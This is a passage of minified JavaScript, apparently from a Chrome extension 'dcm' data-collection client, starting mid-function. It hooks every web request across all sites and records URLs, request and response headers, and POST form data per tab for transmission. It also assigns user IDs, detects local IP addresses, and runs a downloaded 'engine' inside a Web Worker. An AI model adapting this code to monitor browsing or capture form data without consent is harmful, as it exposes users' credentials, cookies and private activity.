s(r,s){if(t<=s){var o=i()+"	"+Mt.Desc[s]+"	"+e+"	"+r;n.forEach(function(e){e.append(o,s)})}}k.call(this);this.debug=function(e){s(e,Mt.DEBUG)};this.info=function(e){s(e,Mt.INFO)};this.warn=function(e){s(e,Mt.WARN)};this.error=function(e){s(e,Mt.ERROR)}}function At(e){C.call(this);var t=e.storageFactory.getSettings();var n=new Ct(e.storageFactory.getStorage("dcm-log.txt"));var r=new Nt;this.getLogger=function(e){var i="Warn";var s=t.get("logLevel");if(s&&s.match("^(Debug|Info|Warn|Error)$")!=null){i=s}return new Lt(e,Mt[i.toUpperCase()],[n,r])}}function Ot(e){t.call(this);this.create=function(t){e.loggerFactory=new At(e)}}function _t(e){t.call(this);var n;this.create=function(t){var r=new Dt(e);var i=new Ht(e,r);n=new Pt(e,i);n.start(chrome.webRequest)};this.destroy=function(){n.stop(chrome.webRequest)}}function Dt(e){function t(e){var t={};if(e){for(var n=0;n<e.length;n++){var r=e[n];t[r.name]=r.value}}return t}function n(e,t){if(t.frameId!=0){e.setFrameId(t.frameId)}}function r(e,t){var n=t.type=="main_frame"||t.type=="sub_frame"?"main":"resource";e.setRequestType(n)}function i(e,t){if(t.postData!=undefined){var n="";for(var r in t.postData){n+=r+"="+t.postData[r]+"&"}e.setPostData(n.replace(/&$/,""))}}function s(t){var n=e.tabs.controller.getOpenerTabId(t.getUrl(),t.getTabId());if(n!=undefined){t.setOpenerTabId(n)}}this.updateTabId=function(t){var n=t.getTabId();var r=e.tabs.controller.getUpdatedTabId(n);if(n!=r){t.setTabId(r)}s(t)};this.createRequestData=function(e){var s=new L;s.setUrl(e.url);s.setStatusCode(e.statusCode);s.setMethod(e.method);s.setTabId(e.tabId);n(s,e);i(s,e);r(s,e);s.setRequestHeaders(t(e.requestHeaders));s.setResponseHeaders(t(e.responseHeaders));return s}}function Pt(e,t){function s(e){return e.tabId!=-1}function o(e){if(s(e)){if(e.requestBody!=undefined){if(i[e.requestId]==undefined){i[e.requestId]={}}i[e.requestId].postData=e.requestBody.formData}}}function u(e){if(s(e)){c(e)}}function a(e){if(s(e)){if(i[e.requestId]==undefined){i[e.requestId]={}}i[e.requestId].requestHeaders=e.requestHeaders}}function f(e){if(s(e)){c(e)}}function l(e){if(s(e)){delete i[e.requestId];r.info("Error occurred while capturing click ["+e.url+"]")}}function c(e){if(i[e.requestId]!==undefined){e.requestHeaders=i[e.requestId].requestHeaders;e.postData=i[e.requestId].postData}t.send(e);delete i[e.requestId]}var n={urls:["http://*/*","https://*/*"],types:["main_frame","sub_frame","stylesheet","script","image","object","xmlhttprequest","other"]};var r=e.loggerFactory.getLogger("monitoring.RequestDataMonitor");var i={};this.start=function(e){e.onBeforeRequest.addListener(o,n,["requestBody"]);e.onBeforeRedirect.addListener(u,n,["responseHeaders"]);e.onBeforeSendHeaders.addListener(a,n,["requestHeaders"]);e.onCompleted.addListener(f,n,["responseHeaders"]);e.onErrorOccurred.addListener(l,n)};this.stop=function(e){e.onErrorOccurred.removeListener(l);e.onCompleted.removeListener(f);e.onBeforeSendHeaders.removeListener(a);e.onBeforeRedirect.removeListener(u);e.onBeforeRequest.removeListener(o)}}function Ht(e,t){function o(e){t.updateTabId(e);s.info("Sending click [ "+e.getUrl()+"]");i.transmit(p.REQUEST_MONITORING_SUBJECT,p.REQUEST_MONITORING_DATA_READY,e.getData())}function u(e,t){for(var r=0;r<n.length;r++){if(n[r].getTabId()==e){var i=n.splice(r--,1);t(i[0])}}}function a(e){s.info("Sending collected clicks for tab ["+e+"].");u(e,o)}function f(e){s.info("Deleting collected clicks for tab ["+e+"].");u(e,function(){})}function l(e){return r.indexOf(e.getTabId())!=-1}e.communication.factory.extendReciever(this,p.TAB_STATE_CHANGE_SUBJECT);var n=[];var r=[];var i=e.communication.factory.createSender();var s=e.loggerFactory.getLogger("client.monitoring.RequestDataSender");this.send=function(e){var r=t.createRequestData(e);if(r){if(l(r)){o(r)}else{n.push(r);s.info("Collecting click ["+r.getUrl()+"] "+"for hidden tab ["+r.getTabId()+"]")}}};this.onMessage=function(e,t){switch(e){case p.TAB_VISIBLE:case p.TAB_HIDDEN:r.push(t);a(t);break;case p.TAB_RELOADED:f(t);break}}}function Bt(){tt.call(this);this.build=function(t){var n=new Blob([t],{type:"application/javascript"});var r=e.webkitURL.createObjectURL(n);return new Worker(r)}}function jt(t,n){function i(e){var t="Unknown Error";if(e!==undefined&&e.code!==undefined){switch(e.code){case FileError.QUOTA_EXCEEDED_ERR:t="QUOTA_EXCEEDED_ERR";break;case FileError.NOT_FOUND_ERR:t="NOT_FOUND_ERR";break;case FileError.SECURITY_ERR:t="SECURITY_ERR";break;case FileError.INVALID_MODIFICATION_ERR:t="INVALID_MODIFICATION_ERR";break;case FileError.INVALID_STATE_ERR:t="INVALID_STATE_ERR";break}}}function s(t,i){if(r){t()}else{var s=function(e){r=e;t()};var o=e.requestFileSystem||e.webkitRequestFileSystem;o(n,5*1024*1024,s,i)}}function o(e,t){return function(n){i(n);e(t!==undefined?t:false)}}function u(e,n){r.root.getFile(t,{},function(t){t.file(function(t){var n=new FileReader;n.onloadend=function(t){e(this.result)};n.readAsText(t)},n)},n)}function a(e,n,i,s){r.root.getFile(t,{create:true},function(t){t.createWriter(function(t){t.onwriteend=function(t){e(true)};t.onerror=function(e){console.log("Write failed: "+e.toString());n()};var r=new Blob([i],{type:"text/plain"});if(!s){t.seek(t.length)}t.write(r)},n)},n)}function f(e,n){r.root.getFile(t,{create:false},function(t){t.createWriter(function(t){t.onwriteend=function(t){e(true)};t.onerror=function(e){console.log("Truncate failed: "+e.toString());n()};t.truncate(0)},n)},n)}function l(e,n){r.root.getFile(t,{create:false},function(t){e(true)},n)}function c(e,n){r.root.getFile(t,{create:false},function(t){t.remove(function(){e(true)},n)},n)}P.call(this);var r;this.read=function(e){var t=o(e,null);var n=function(){u(e,t)};s(n,t)};this.write=function(e,t){var n=o(e);var r=function(){a(e,n,t,true)};var i=this;var u=function(){i.exist(function(e){if(e){f(r,n)}else{r()}})};s(u,n)};this.append=function(e,t){var n=o(e);var r=function(){a(e,n,t,false)};s(r,n)};this.exist=function(e){var t=o(e);var n=function(){l(e,t)};s(n,t)};this.remove=function(e){var t=o(e);var n=function(){c(e?e:function(){},t)};s(n,t)}}function Ft(e,t){function r(e){var t=null;var r=n[typeof e];if(r){t=r+e}else{throw"Unrecognized type of value ("+e+")"}return t}function i(e){var t;if(e!==undefined&&e!==null){var r=e.charAt(0);var i=e.substr(1);switch(r){case n.boolean:t=i==="true";break;case n.number:t=parseInt(i);break;case n.string:t=i;break;default:throw"Unrecognized type of value ("+e+")"}}return t}function s(e){return t+e}function o(e){if(e.indexOf(t)==0){return e.substr(t.length)}return null}_.call(this);var n={"boolean":"B",number:"N",string:"S"};this.set=function(t,n){var i=s(t);e.setItem(i,r(n))};this.get=function(t){var n=s(t);return i(e.getItem(n))};this.has=function(e){return this.get(e)!=null};this.remove=function(t){var n=s(t);e.removeItem(n)};this.removeAll=function(){for(var t in e){var n=o(t);if(n!=null){this.remove(n)}}};this.getAll=function(){var t={};for(var n in e){var r=o(n);if(r!=null){try{t[r]=this.get(r)}catch(i){}}}return t}}function It(e){t.call(this);this.create=function(t){e.storageFactory=new qt};this.cleanup=function(){var t=e.storageFactory.getSettings();t.removeAll()}}function qt(){D.call(this);this.getStorage=function(t){return new jt(t,e.PERSISTENT)};this.getSettings=function(){return new Ft(localStorage,"dcm.")}}function Rt(e){rt.call(this);this.createNetworkUtils=function(){return new it(e)}}function Ut(e){t.call(this);var n=null;this.create=function(){n=new ot(e,new Rt(e))}}function zt(e,t,n){function i(e){if(e.name==n&&e.sender!=undefined&&e.sender.tab!=undefined&&e.sender.tab.id!=undefined){s(e)}}function s(e){var t=o(e);var n=u(t);e.onMessage.addListener(t);e.onDisconnect.addListener(n)}function o(e){return function(t){var n={portName:e.name,tabId:e.sender.tab.id,data:t.data};if(t.id==1){r.send(p.PORT_LISTENER_SUBJECT,p.TAB_VISIBILITY_CHANGED,n)}else if(t.id==2){r.send(p.PORT_LISTENER_SUBJECT,p.CONTEXT_MENU_SHOWN,n)}}}function u(e){return function t(n){n.onDisconnect.removeListener(t);n.onMessage.removeListener(e);var i={portName:n.name,tabId:n.sender.tab.id};r.send(p.PORT_LISTENER_SUBJECT,p.PORT_DISCONNECTED,i)}}var r=e.communication.factory.createSender();this.start=function(){t.extension.onConnect.addListener(i)};this.stop=function(){t.extension.onConnect.removeListener(i)}}function Wt(e){t.call(this);var n;this.create=function(t){e.tabs={};e.tabs.controller=new Xt(e,chrome);e.tabs.controller.start();n=new zt(e,chrome,"page-state-tracker");n.start()};this.destroy=function(){e.tabs.controller.stop();n.stop()}}function Xt(e,t){function u(e){o.info("Tab ["+e.tabId+"] was replaced with tab ["+e.replacedTabId+"]");n[e.tabId]=e.replacedTabId}function a(e){o.info("onCreatedNavigationTarget. "+"tabId ["+e.tabId+"]; "+"sourceTabId ["+e.sourceTabId+"]; "+"url ["+e.url+"]");r[e.tabId]={sourceTabId:e.sourceTabId,url:e.url}}function f(e){o.info("Tab was created. "+"tabId ["+e.id+"]; "+"sourceTabId ["+e.openerTabId+"]; "+"url ["+e.url+"]");if(e.id!=undefined&&e.url!=undefined){r[e.id]={sourceTabId:e.openerTabId,url:e.url}}}function l(e){var t=null;switch(e.data){case"prerender":t=p.TAB_PRERENDER;break;case"visible":t=p.TAB_VISIBLE;break;case"hidden":t=p.TAB_HIDDEN;break}if(t!=null){o.info("Tab ["+e.tabId+"] state changed to "+e.data);s.send(p.TAB_STATE_CHANGE_SUBJECT,t,e.tabId)}}function c(e){o.info("onContextMenuShown: "+JSON.stringify(e));i[e.data]=e.tabId}function h(e){o.info("Tab ["+e.tabId+"] removed.");s.send(p.TAB_STATE_CHANGE_SUBJECT,p.TAB_RELOADED,e.tabId)}e.communication.factory.extendReciever(this,p.PORT_LISTENER_SUBJECT);var n={};var r={};var i={};var s=e.communication.factory.createSender();var o=e.loggerFactory.getLogger("client.tabs.TabsController");this.onMessage=function(e,t){switch(e){case p.TAB_VISIBILITY_CHANGED:l(t);break;case p.CONTEXT_MENU_SHOWN:c(t);break;case p.PORT_DISCONNECTED:h(t);break}};this.start=function(){t.webNavigation.onTabReplaced.addListener(u);t.webNavigation.onCreatedNavigationTarget.addListener(a);t.tabs.onCreated.addListener(f)};this.stop=function(){t.tabs.onCreated.removeListener(f);t.webNavigation.onCreatedNavigationTarget.removeListener(a);t.webNavigation.onTabReplaced.removeListener(u)};this.getUpdatedTabId=function(e){var t=n[e];if(t==undefined){t=e}return t};this.getOpenerTabId=function(e,t){var n;var s=r[t];if(s!=undefined&&s.url==e){if(s.sourceTabId==undefined){n=i[e]}else{n=s.sourceTabId}}o.info("getOpenerTabId; "+"url = "+e+"; "+"tabId = "+t+"; "+"openerTabId = "+n);return n}}var p={ANY_TOPIC:".*",APPLICATION_LOG_SUBJECT:"application-log",REQUEST_MONITORING_SUBJECT:"monitoring-requests",REQUEST_MONITORING_DATA_READY:"request-data-availabale",PRIVACY_MODE_SUBJECT:"privacy-mode",PRIVACY_MODE_ENABLED:"entering-privacy-mode",PRIVACY_MODE_DISABLED:"exiting-privacy-mode",XHR_REMOTE_FUNCTION_SUBJECT:"xhr-executor-remote-function",REMOTE_DISK_STORAGE:"remote-disk-storage",REMOTE_SETTINGS_STORAGE:"remote-settings-storage",REMOTE_BROWSER_COMPONENT:"remote-browser-component",REMOTE_OBJECT_SUBJECT:"remote-objects",REMOTE_OBJECT_CREATE_TOPIC:"create-object",REMOTE_OBJECT_DESROY_TOPIC:"destroy-object",ENGINE_WORKER_SUBJECT:"engine-worker",WORKER_ERROR_TOPIC:"worker-code-error",WORKER_CODE_EXIST_TOPIC:"worker-class-ready",ENGINE_CREATE_TOPIC:"engine-create-command",ENGINE_CREATED_TOPIC:"engine-created-command",ENGINE_DESTROY_TOPIC:"engine-destroy-command",ENGINE_OPTIONS_TOPIC:"engine-options-command",ENGINE_CLEANUP_TOPIC:"engine-cleanup-command",SYSTEM_INFO_SUBJECT:"system_info_subject",LOCAL_IP_ADDRESS_DETECTED_TOPIC:"local_ip_address_detected_topic",OPT_IN_DIALOG_SUBJECT:"opt_in_dialog_subject",OPT_IN_DIALOG_CONFIG_AVAILABLE:"opt_in_dialog_config_available",OPT_IN_DIALOG_CONFIG_REMOVED:"opt_in_dialog_config_removed"};var A={CLIENT_VERSION:"version.client",ENGINE_VERSION:"version.engine",USER_ID:"user-id",GROUP_ID:"group-id",DATA_DISABLED_KEY:"data-capturing-disabled",EPOCH_OFFSET:"epoch-offset",LOCAL_ADDRESS:"local-address",CONFIRMATION_PAGE_SHOWN:"confirmation-page-shown"};p.CLIENT_DIAGNOSTIC_SUBJECT="client-diagnostic-subject";p.CLIENT_SYNC_DIAGNOSTIC_SUBJECT="client-sync-diagnostic-subject";p.ENGINE_DOWNLOAD_SUCCEEDED="dcm-engine-download-succeeded";p.ENGINE_DOWNLOAD_FAILED="dcm-engine-download-failed";p.ENGINE_FAILURE="dcm-engine-failure";p.CLIENT_INSTALLED="dcm-client-installed";p.CLIENT_UPDATED="dcm-client-updated";p.CLIENT_UNINSTALLED="dcm-client-uninstalled";p.USER_OPTED_IN="dcm-user-opted-in";p.USER_OPTED_OUT="dcm-user-opted-out";p.USER_ID_RESTORED="dcm-user-id-restored";p.DCM_DISABLED="dcm-disabled";p.DCM_ENABLED="dcm-enabled";p.TAB_STATE_CHANGE_SUBJECT="tab-state-change-subject";p.TAB_VISIBLE="tab_visible";p.TAB_HIDDEN="tab_hidden";p.TAB_PRERENDER="tab_prerender";p.TAB_RELOADED="tab_reloaded";p.HOST_VERSION_UPDATED="dcm-host-version-updated";p.PORT_LISTENER_SUBJECT="port-listener-subject";p.TAB_VISIBILITY_CHANGED="on-visibility-changed";p.CONTEXT_MENU_SHOWN="on-context-menu-shown";p.PORT_DISCONNECTED="port-disconnected";var nt={HOST_VERSION:"version.host"};var bt=new n("client");e.dcm=bt;bt.addComponent("client/communication",["client/logging"],new s(bt));bt.addComponent("client/diagnostic",["client/communication","client/storage"],new q(bt));bt.addComponent("client/addon",["client/storage","client/diagnostic","client/communication"],new F(bt));bt.addComponent("client/install",["client/diagnostic","client/version"],new U(bt));bt.addComponent("client/version",[],new W);bt.addComponent("client/options",["client/storage","client/browser","client/diagnostic","client/communication"],new V(bt));bt.addComponent("client/wrappers",["client/browser","client/communication","client/logging","client/monitoring","client/storage","client/xhr"],new at(bt));bt.addComponent("client/xhr",["client/options"],new dt(bt,new vt));bt.addComponent("client/uninstall",["client/diagnostic","client/communication"],new ut(bt));bt.addComponent("client/browser",["client/communication","client/logging"],new Et(bt));e.dcm_api=new I(bt);bt.addComponent("client/all",["client/browser","client/communication","client/diagnostic","client/logging","client/monitoring","client/storage","client/wrappers","client/xhr","client/install"],new Tt(bt));bt.addComponent("client/settings",["client/options","client/storage"],new z(bt));bt.addComponent("client/logging",["client/storage"],new Ot(bt));var Mt={DEBUG:1,INFO:2,WARN:3,ERROR:4,Desc:{1:"DEBUG",2:"INFO",3:"WARN",4:"ERROR"}};bt.addComponent("client/monitoring",["client/communication","client/logging","client/tabs"],new _t(bt));bt.addComponent("client/runner",["client/all"],new Y(bt,new Bt));bt.addComponent("client/runner/errors",["client/all"],new et(bt));bt.addComponent("client/runner/downloader",["client/all"],new K(bt));bt.addComponent("client/storage",[],new It(bt));bt.addComponent("client/system",["client/communication","client/logging"],new Ut(bt));bt.addComponent("client/tabs",["client/communication","client/logging"],new Wt(bt))})(window);var startup=new DcmStartup;
	})()
},0)

